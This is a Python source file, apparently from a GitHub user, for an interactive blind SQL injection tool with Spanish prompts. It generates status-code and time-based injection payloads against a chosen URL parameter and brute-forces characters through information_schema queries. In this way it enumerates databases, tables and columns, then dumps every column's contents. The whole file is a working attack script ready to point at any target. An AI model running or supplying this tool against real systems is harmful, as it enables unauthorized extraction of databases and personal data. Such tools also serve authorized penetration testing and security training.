#!/usr/bin/python3

import requests
import signal
import sys
import time
import argparse
from pwn import *


def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


class BlindSQLi:

    def __init__(self, url, param, method):
        self.url = url
        self.param = param
        self.method = method  # "conditional" or "time"
        self.sleep_time = 0.35

    @staticmethod
    def _to_hex(value):
        return "0x" + value.encode().hex()

    def _check(self, injection):
        target = f"{self.url}?{self.param}={injection}"

        if self.method == "time":
            start = time.time()
            r = requests.get(target)
            elapsed = time.time() - start
            return elapsed > self.sleep_time
        else:
            r = requests.get(target)
            return r.status_code == 200

    def _build_injection(self, query, position, char_code):
        if self.method == "time":
            return f"1 and if(ascii(substr(({query}),{position},1))={char_code},sleep({self.sleep_time}),1)"
        else:
            return f"9 or ascii(substring(({query}),{position},1))={char_code}"

    def _extract_length(self, query):
        for length in range(1, 200):
            if self.method == "time":
                injection = f"1 and if(length(({query}))={length},sleep({self.sleep_time}),1)"
            else:
                injection = f"9 or length(({query}))={length}"

            if self._check(injection):
                return length
        return 0

    def extract_data(self, query, label="Datos"):
        p1 = log.progress("Fuerza bruta")
        p1.status("Iniciando proceso de fuerza bruta")
        time.sleep(1)

        p2 = log.progress(label)

        extracted = ""

        for position in range(1, 500):
            found = False
            for char_code in range(32, 127):
                injection = self._build_injection(query, position, char_code)
                p1.status(f"Pos {position} | Char {char_code} ({chr(char_code)})")

                if self._check(injection):
                    extracted += chr(char_code)
                    p2.status(extracted)
                    found = True
                    break

            if not found:
                break

        p1.success("Completado")
        p2.success(extracted)
        return extracted

    def get_databases(self):
        log.info("Extrayendo bases de datos...")
        query = "select group_concat(schema_name separator 0x2c) from information_schema.schemata"
        result = self.extract_data(query, "Bases de datos")
        if result:
            return [db.strip() for db in result.split(",") if db.strip()]
        return []

    def get_tables(self, database):
        log.info(f"Extrayendo tablas de '{database}'...")
        db_hex = self._to_hex(database)
        query = f"select group_concat(table_name separator 0x2c) from information_schema.tables where table_schema={db_hex}"
        result = self.extract_data(query, f"Tablas [{database}]")
        if result:
            return [t.strip() for t in result.split(",") if t.strip()]
        return []

    def get_columns(self, database, table):
        log.info(f"Extrayendo columnas de '{database}.{table}'...")
        db_hex = self._to_hex(database)
        tbl_hex = self._to_hex(table)
        query = f"select group_concat(column_name separator 0x2c) from information_schema.columns where table_schema={db_hex} and table_name={tbl_hex}"
        result = self.extract_data(query, f"Columnas [{table}]")
        if result:
            return [c.strip() for c in result.split(",") if c.strip()]
        return []

    def dump_column(self, database, table, column):
        log.info(f"Dumpeando '{database}.{table}.{column}'...")
        query = f"select group_concat({column} separator 0x2c) from {database}.{table}"
        result = self.extract_data(query, f"Dump [{table}.{column}]")
        if result:
            return [v.strip() for v in result.split(",") if v.strip()]
        return []


def print_banner():
    print("""
\033[1;36m
  ____  _ _           _   ____   ___  _     _
 | __ )| (_)_ __   __| | / ___| / _ \\| |   (_)
 |  _ \\| | | '_ \\ / _` | \\___ \\| | | | |   | |
 | |_) | | | | | | (_| |  ___) | |_| | |___| |
 |____/|_|_|_| |_|\\__,_| |____/ \\__\\_\\_____|_|

\033[1;33m        [ Blind SQL Injection Tool ]
\033[1;31m        [    Status Code & Time    ]
\033[0m\033[1;37m        By amis13 (https://github.com/amis13)
\033[0m
""")


def print_results_table(title, headers, rows):
    if not rows:
        log.warning(f"No se encontraron resultados para: {title}")
        return

    col_widths = [len(h) for h in headers]
    for row in rows:
        for i, val in enumerate(row):
            if len(str(val)) > col_widths[i]:
                col_widths[i] = len(str(val))

    separator = "+" + "+".join("-" * (w + 2) for w in col_widths) + "+"
    header_line = "|" + "|".join(f" {h:<{col_widths[i]}} " for i, h in enumerate(headers)) + "|"

    print(f"\n\033[1;36m{'=' * 60}")
    print(f"  {title}")
    print(f"{'=' * 60}\033[0m")
    print(f"\033[1;32m{separator}")
    print(header_line)
    print(f"{separator}\033[0m")
    for row in rows:
        row_line = "|" + "|".join(f" {str(v):<{col_widths[i]}} " for i, v in enumerate(row)) + "|"
        print(row_line)
    print(f"\033[1;32m{separator}\033[0m")
    print()


def select_option(options, prompt_msg):
    for i, opt in enumerate(options, 1):
        print(f"  \033[1;33m[{i}]\033[0m {opt}")

    while True:
        try:
            choice = input(f"\n\033[1;36m{prompt_msg} \033[0m")
            idx = int(choice) - 1
            if 0 <= idx < len(options):
                return options[idx]
            print("\033[1;31m[!] Opcion invalida\033[0m")
        except ValueError:
            print("\033[1;31m[!] Introduce un numero valido\033[0m")
        except EOFError:
            sys.exit(1)


def main():
    print_banner()

    print("\033[1;33m[*] Configuracion inicial\033[0m\n")

    try:
        url = input("\033[1;36m[?] URL objetivo (ej: http://localhost/searchUsers.php): \033[0m").strip()
        param = input("\033[1;36m[?] Parametro vulnerable (ej: id): \033[0m").strip()

        print("\n\033[1;33m[*] Metodo de inyeccion:\033[0m")
        print("  \033[1;33m[1]\033[0m Conditional (Status Code)")
        print("  \033[1;33m[2]\033[0m Time-Based (Sleep)")
        method_choice = input("\n\033[1;36m[?] Selecciona metodo (1/2): \033[0m").strip()
    except (EOFError, KeyboardInterrupt):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)

    method = "conditional" if method_choice == "1" else "time"

    print(f"\n\033[1;32m[+] URL:       {url}")
    print(f"[+] Parametro: {param}")
    print(f"[+] Metodo:    {method}\033[0m\n")

    sqli = BlindSQLi(url, param, method)

    # --- Fase 1: Bases de datos ---
    databases = sqli.get_databases()
    if not databases:
        log.failure("No se pudieron extraer bases de datos")
        sys.exit(1)

    print_results_table("BASES DE DATOS", ["#", "Database"], [(i + 1, db) for i, db in enumerate(databases)])

    # --- Fase 2: Seleccionar DB y listar tablas ---
    selected_db = select_option(databases, "Selecciona una base de datos:")
    tables = sqli.get_tables(selected_db)
    if not tables:
        log.failure(f"No se encontraron tablas en '{selected_db}'")
        sys.exit(1)

    print_results_table(f"TABLAS EN '{selected_db}'", ["#", "Table"], [(i + 1, t) for i, t in enumerate(tables)])

    # --- Fase 3: Seleccionar tabla y listar columnas ---
    selected_table = select_option(tables, "Selecciona una tabla:")
    columns = sqli.get_columns(selected_db, selected_table)
    if not columns:
        log.failure(f"No se encontraron columnas en '{selected_table}'")
        sys.exit(1)

    print_results_table(f"COLUMNAS EN '{selected_db}.{selected_table}'", ["#", "Column"], [(i + 1, c) for i, c in enumerate(columns)])

    # --- Fase 4: Dump de datos ---
    print(f"\n\033[1;33m[*] Dumpeando todas las columnas de '{selected_table}'...\033[0m\n")

    dump_data = {}
    for col in columns:
        values = sqli.dump_column(selected_db, selected_table, col)
        dump_data[col] = values

    # Construir tabla de resultados
    max_rows = max(len(v) for v in dump_data.values()) if dump_data else 0
    headers = ["#"] + columns
    rows = []
    for i in range(max_rows):
        row = [i + 1]
        for col in columns:
            val = dump_data[col][i] if i < len(dump_data[col]) else ""
            row.append(val)
        rows.append(row)

    print_results_table(f"DUMP DE '{selected_db}.{selected_table}'", headers, rows)

    log.success("Extraccion completada")


if __name__ == '__main__':
    main()
